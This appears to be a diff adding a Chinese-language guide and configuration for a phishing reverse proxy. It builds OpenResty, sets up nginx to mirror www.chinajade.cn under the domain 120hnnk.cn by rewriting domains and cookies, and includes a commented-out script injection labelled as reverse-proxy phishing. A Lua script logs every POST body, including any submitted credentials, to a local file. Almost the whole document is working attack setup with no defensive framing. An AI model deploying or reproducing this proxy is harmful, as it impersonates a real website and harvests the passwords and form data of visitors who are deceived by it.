@@ -1,0 +1,99 @@
+1、编译安装openresty
+
+mkdir /data/requirements
+cd  /data/requirements
+git clone https://github.com/yaoweibin/ngx_http_substitutions_filter_module
+wget https://openresty.org/download/openresty-1.13.6.2.tar.gz
+tar -zxvf openresty-1.13.6.2.tar.gz
+yum -y install zlib zlib-devel openssl openssl-devel pcre pcre-devel
+yum -y install gcc gcc-c++ autoconf automake make
+cd openresty-1.13.6.2
+./configure  --with-http_sub_module --with-pcre-jit --with-ipv6 --add-module=/data/requirements/ngx_http_substitutions_filter_module
+gmake 
+gmake install
+
+
+
+2、
+server {
+     listen 80;
+     server_name www.120hnnk.cn;
+     index autoindex;
+     client_body_in_file_only on;
+     lua_need_request_body on;
+     client_max_body_size 2m;
+     client_body_buffer_size 2m;
+
+   location ~ / {
+             proxy_pass http://www.chinajade.cn;
+             proxy_cookie_domain www.chinajade.cn www.120hnnk.cn;
+             proxy_buffering off;
+             proxy_set_header Host "www.chinajade.cn";
+             proxy_set_header Accept-Encoding "";
+             proxy_set_header X-Real-IP $remote_addr;
+             proxy_set_header User-Agent $http_user_agent;
+             proxy_set_header referer "http://www.chinajade.cn$request_uri";
+             subs_filter  www.chinajade.cn www.120hnnk.cn;
+            # subs_filter 收藏本站  <script>alert("nginx反向代理钓鱼")</script>;
+            # access_by_lua_file /usr/local/openresty/nginx/conf/vhost/test.lua;
+   
+          }
+        access_log logs/120hnnk.cn.log;
+ }
+server {
+     listen 80;
+     server_name 120hnnk.cn;
+     index autoindex;
+     client_body_in_file_only on;
+     lua_need_request_body on;
+     client_max_body_size 2m;
+     client_body_buffer_size 2m;
+
+   location ~ / {
+             proxy_pass http://chinajade.cn;
+             proxy_cookie_domain chinajade.cn 120hnnk.cn;
+             proxy_buffering off;
+             proxy_set_header Host "chinajade.cn";
+             proxy_set_header Accept-Encoding "";
+             proxy_set_header X-Real-IP $remote_addr;
+             proxy_set_header User-Agent $http_user_agent;
+             proxy_set_header referer "http://chinajade.cn$request_uri";
+             subs_filter  chinajade.cn 120hnnk.cn;
+            # subs_filter 收藏本站  <script>alert("nginx反向代理钓鱼")</script>;
+            # access_by_lua_file /usr/local/openresty/nginx/conf/vhost/test.lua;
+          }
+        access_log logs/120hnnk.cn.log;
+
+ }
+
+
+3、
+test.lua
+function getFile(file_name)
+         local f = assert(io.open(file_name, 'r'))
+         local string = f:read("*all")
+
+         f:close()
+         return string
+ end
+if ngx.req.get_method() == "POST" then
+ ngx.req.read_body()
+ local data = ngx.req.get_body_data()
+ if nil == data then
+    local file_name = ngx.req.get_body_file()
+   -- ngx.say(">> temp file :" ,file_name)   
+    if file_name then
+    data = getFile(file_name)
+
+    end
+ end
+
+   -- ngx.say("hello ", data)
+    local file = io.open("/data/2.txt","a+")
+    file:write(data.."\n")
+    file:close()
+end
+if ngx.req.get_method() == "GET" then
+   ngx.header.content_type = "text/plain"
+  -- ngx.say("get")
+end
